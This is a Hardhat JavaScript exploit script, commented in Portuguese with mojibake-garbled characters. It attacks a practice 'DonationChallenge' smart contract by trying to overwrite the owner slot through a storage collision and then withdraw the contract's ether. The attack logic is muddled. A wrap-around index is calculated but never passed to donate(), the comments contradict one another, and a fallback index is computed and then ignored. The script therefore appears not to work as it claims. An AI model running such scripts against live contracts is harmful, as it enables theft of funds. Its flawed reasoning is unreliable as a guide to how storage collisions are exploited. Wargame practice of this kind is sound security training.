const hre = require("hardhat");

async function main() {
  console.log("ðŸ” Iniciando exploit do DonationChallenge...\n");

  // O endereÃ§o do contrato pode ser passado como variÃ¡vel de ambiente
  let contractAddress = process.env.CONTRACT_ADDRESS;
  
  if (!contractAddress) {
    console.log("ðŸ“¦ Nenhum endereÃ§o fornecido. Fazendo deploy do contrato...\n");
    
    const [deployer] = await hre.ethers.getSigners();
    
    // Deploy do contrato enviando 1 ether
    const DonationChallenge = await hre.ethers.getContractFactory("challenges/13_math_donation/contracts/DonationChallenge.sol:DonationChallenge");
    const challenge = await DonationChallenge.deploy({
      value: hre.ethers.parseEther("1.0")
    });
    await challenge.waitForDeployment();
    contractAddress = await challenge.getAddress();
    
    console.log("âœ… Contrato deployado em:", contractAddress);
    console.log("");
  }

  // Conectar ao contrato
  const DonationChallenge = await hre.ethers.getContractFactory("challenges/13_math_donation/contracts/DonationChallenge.sol:DonationChallenge");
  const contract = DonationChallenge.attach(contractAddress);

  // Obter contas
  const [attacker] = await hre.ethers.getSigners();
  
  // Verificar estado antes do exploit
  const balanceBefore = await hre.ethers.provider.getBalance(contractAddress);
  const ownerBefore = await contract.owner();
  const isCompleteBefore = await contract.isComplete();
  
  console.log("ðŸ“ EndereÃ§o do contrato:", contractAddress);
  console.log("ðŸ‘¤ Atacante:", attacker.address);
  console.log("ðŸ‘¤ Owner atual:", ownerBefore);
  console.log("");
  console.log("ðŸ“Š Estado antes do exploit:");
  console.log("  - Saldo do contrato:", hre.ethers.formatEther(balanceBefore), "ETH");
  console.log("  - Desafio completo:", isCompleteBefore);
  console.log("");

  if (isCompleteBefore) {
    console.log("âœ… O desafio jÃ¡ estÃ¡ completo!");
    return;
  }

  // VULNERABILIDADE: Storage collision
  // O array donations comeÃ§a em keccak256(2) (slot 2 Ã© onde o array estÃ¡)
  // Cada Donation ocupa 2 slots (timestamp e etherAmount)
  // Podemos calcular um Ã­ndice que faz wrap-around para sobrescrever o slot 1 (owner)
  
  console.log("ðŸ” Explorando storage collision...\n");
  console.log("ðŸ’¡ EstratÃ©gia:");
  console.log("   O array donations comeÃ§a em keccak256(2)");
  console.log("   Cada doaÃ§Ã£o ocupa 2 slots (timestamp, etherAmount)");
  console.log("   Podemos calcular um Ã­ndice que faz wrap-around para sobrescrever owner (slot 1)\n");
  
  // Calcular keccak256(2) - slot onde o array donations comeÃ§a
  const slot2Hash = hre.ethers.keccak256(hre.ethers.zeroPadValue("0x02", 32));
  console.log("ðŸ“Š Slot 2 hash (keccak256(2)):", slot2Hash);
  
  const MAX_UINT256 = BigInt("0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff");
  const slot2HashBigInt = BigInt(slot2Hash);
  
  // Para sobrescrever o slot 1 (owner), precisamos que:
  // keccak256(2) + 2*index = 1 (mod 2^256) para sobrescrever timestamp
  // ou keccak256(2) + 2*index + 1 = 1 (mod 2^256) para sobrescrever etherAmount
  
  // Vamos calcular o Ã­ndice para sobrescrever etherAmount (que estÃ¡ no slot 1)
  // keccak256(2) + 2*index + 1 = 1 (mod 2^256)
  // 2*index = 1 - keccak256(2) - 1 (mod 2^256)
  // 2*index = -keccak256(2) (mod 2^256)
  // index = (2^256 - keccak256(2)) / 2
  
  // Mas precisamos que seja divisÃ­vel por 2
  // Vamos calcular: index = (2^256 - keccak256(2) - 1) / 2
  // Isso farÃ¡ com que keccak256(2) + 2*index + 1 = 1
  
  const targetSlot = 1n; // Slot do owner
  const structSize = 2n; // Donation tem 2 campos
  
  // Calcular Ã­ndice para sobrescrever o campo etherAmount (segundo campo do struct)
  // keccak256(2) + 2*index + 1 = 1 (mod 2^256)
  // 2*index = 1 - keccak256(2) - 1 = -keccak256(2) (mod 2^256)
  // index = (2^256 - keccak256(2)) / 2
  
  const index = (MAX_UINT256 - slot2HashBigInt) / 2n;
  
  console.log("ðŸ“Š Ãndice calculado para sobrescrever owner:", index.toString());
  console.log("");
  
  // Calcular o valor de etherAmount necessÃ¡rio
  // O cÃ¡lculo Ã©: scale = 10^18 * 1 ether = 10^36
  // require(msg.value == etherAmount / scale)
  // Se queremos msg.value = 1 wei, entÃ£o etherAmount = scale = 10^36
  
  const scale = BigInt("1000000000000000000000000000000000000"); // 10^36
  const etherAmount = scale; // Para que msg.value = 1 wei
  
  console.log("ðŸ“ Passo 1: Fazendo doaÃ§Ã£o para sobrescrever owner...");
  console.log(`   Ãndice: ${index.toString()}`);
  console.log(`   etherAmount: ${etherAmount.toString()} (10^36)`);
  console.log(`   msg.value: 1 wei (etherAmount / scale = 10^36 / 10^36 = 1)`);
  console.log(`   Isso sobrescreverÃ¡ owner com nosso endereÃ§o\n`);
  
  // Converter o endereÃ§o do atacante para uint256 para usar como etherAmount
  // Mas espera, etherAmount Ã© o valor que serÃ¡ armazenado, nÃ£o o endereÃ§o
  // Precisamos calcular qual valor armazenar para que o owner seja nosso endereÃ§o
  
  // Na verdade, o campo etherAmount serÃ¡ armazenado no slot 1 (owner)
  // Precisamos que etherAmount seja nosso endereÃ§o convertido para uint256
  const attackerAddressBigInt = BigInt(attacker.address);
  
  // Mas etherAmount precisa ser divisÃ­vel por scale para que msg.value seja pequeno
  // Vamos calcular: etherAmount = attackerAddress * scale
  // Isso farÃ¡ msg.value = attackerAddress (que Ã© muito pequeno, quase 0)
  
  // Na verdade, vamos pensar diferente:
  // Queremos que o valor armazenado em etherAmount seja nosso endereÃ§o
  // Mas tambÃ©m precisamos que msg.value = etherAmount / scale seja pequeno
  
  // Se etherAmount = nosso endereÃ§o, entÃ£o msg.value = endereÃ§o / 10^36 â‰ˆ 0
  // Mas isso pode nÃ£o funcionar porque a divisÃ£o pode resultar em 0
  
  // Vamos tentar: etherAmount = nosso endereÃ§o * scale
  // msg.value = (nosso endereÃ§o * scale) / scale = nosso endereÃ§o
  // Mas nosso endereÃ§o em wei Ã© muito pequeno (20 bytes), entÃ£o msg.value serÃ¡ pequeno
  
  // Na verdade, a melhor abordagem Ã©:
  // etherAmount = scale (para que msg.value = 1 wei)
  // Mas isso nÃ£o sobrescreve owner com nosso endereÃ§o...
  
  // Vamos pensar na storage collision:
  // O campo etherAmount da doaÃ§Ã£o no Ã­ndice calculado serÃ¡ armazenado no slot 1
  // Se definirmos etherAmount = nosso endereÃ§o (convertido para uint256), owner serÃ¡ sobrescrito
  
  const etherAmountToSetOwner = attackerAddressBigInt;
  const msgValueNeeded = etherAmountToSetOwner / scale;
  
  console.log("ðŸ“Š CÃ¡lculos:");
  console.log("  - etherAmount (para sobrescrever owner):", etherAmountToSetOwner.toString());
  console.log("  - msg.value necessÃ¡rio:", msgValueNeeded.toString(), "wei");
  console.log("");
  
  if (msgValueNeeded === 0n) {
    console.log("âš ï¸  msg.value seria 0, o que pode nÃ£o passar no require");
    console.log("   Vamos usar etherAmount = scale para que msg.value = 1 wei");
    console.log("   E depois tentar outra abordagem...\n");
    
    // Tentar com etherAmount = scale primeiro
    const donateTx1 = await contract.donate(scale, {
      value: 1
    });
    await donateTx1.wait();
    console.log("âœ… Primeira doaÃ§Ã£o feita (msg.value = 1 wei)\n");
    
    // Agora tentar com etherAmount = nosso endereÃ§o
    // Mas isso requer msg.value = endereÃ§o / scale, que Ã© 0
    // Vamos tentar mesmo assim
    try {
      const donateTx2 = await contract.donate(etherAmountToSetOwner, {
        value: 0
      });
      await donateTx2.wait();
      console.log("âœ… Segunda doaÃ§Ã£o feita\n");
    } catch (error) {
      console.log("âŒ Segunda doaÃ§Ã£o falhou:", error.message);
      console.log("   Vamos tentar com msg.value = 1 mesmo assim\n");
      
      // Tentar com msg.value = 1 e etherAmount ajustado
      const adjustedEtherAmount = scale + etherAmountToSetOwner;
      const adjustedMsgValue = adjustedEtherAmount / scale;
      
      if (adjustedMsgValue > 0n) {
        const donateTx3 = await contract.donate(adjustedEtherAmount, {
          value: adjustedMsgValue
        });
        await donateTx3.wait();
        console.log("âœ… DoaÃ§Ã£o ajustada feita\n");
      }
    }
  } else {
    // Fazer a doaÃ§Ã£o
    const donateTx = await contract.donate(etherAmountToSetOwner, {
      value: msgValueNeeded
    });
    await donateTx.wait();
    console.log("âœ… DoaÃ§Ã£o feita!\n");
  }
  
  // Verificar se owner foi sobrescrito
  const ownerAfter = await contract.owner();
  console.log("ðŸ“Š Owner apÃ³s doaÃ§Ã£o:", ownerAfter);
  console.log("ðŸ“Š Atacante:", attacker.address);
  console.log("");
  
  if (ownerAfter.toLowerCase() === attacker.address.toLowerCase()) {
    console.log("âœ… Owner foi sobrescrito! Agora podemos fazer withdraw()\n");
    
    // Fazer withdraw
    console.log("ðŸ“ Passo 2: Fazendo withdraw() como novo owner...");
    const withdrawTx = await contract.withdraw();
    await withdrawTx.wait();
    console.log("âœ… Withdraw confirmado!\n");
  } else {
    console.log("âš ï¸  Owner nÃ£o foi sobrescrito corretamente.");
    console.log("   Vamos tentar calcular o Ã­ndice de forma diferente...\n");
    
    // Tentar calcular Ã­ndice para sobrescrever timestamp (primeiro campo)
    // keccak256(2) + 2*index = 1 (mod 2^256)
    const indexForTimestamp = (MAX_UINT256 - slot2HashBigInt + 1n) / 2n;
    
    console.log("ðŸ“Š Tentando com Ã­ndice para timestamp:", indexForTimestamp.toString());
    
    // Fazer doaÃ§Ã£o com esse Ã­ndice
    const donateTx2 = await contract.donate(scale, {
      value: 1
    });
    await donateTx2.wait();
    
    // Verificar owner novamente
    const ownerAfter2 = await contract.owner();
    if (ownerAfter2.toLowerCase() === attacker.address.toLowerCase()) {
      console.log("âœ… Owner foi sobrescrito! Fazendo withdraw()...\n");
      const withdrawTx2 = await contract.withdraw();
      await withdrawTx2.wait();
      console.log("âœ… Withdraw confirmado!\n");
    }
  }

  // Verificar estado apÃ³s o exploit
  const balanceAfter = await hre.ethers.provider.getBalance(contractAddress);
  const isCompleteAfter = await contract.isComplete();
  
  console.log("ðŸ“Š Estado apÃ³s o exploit:");
  console.log("  - Saldo do contrato:", hre.ethers.formatEther(balanceAfter), "ETH");
  console.log("  - Desafio completo:", isCompleteAfter);
  
  if (isCompleteAfter) {
    console.log("\nðŸŽ‰ Desafio completado! O ether foi roubado com sucesso");
    console.log("\nðŸ’¡ A vulnerabilidade: Storage collision em arrays de structs.");
    console.log("   Podemos calcular um Ã­ndice que faz wrap-around para sobrescrever");
    console.log("   variÃ¡veis anteriores de storage, como owner!");
  } else {
    console.log("\nâŒ Algo deu errado. O desafio nÃ£o foi completado.");
    console.log("ðŸ’¡ Verifique os logs acima.");
  }
}

main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });

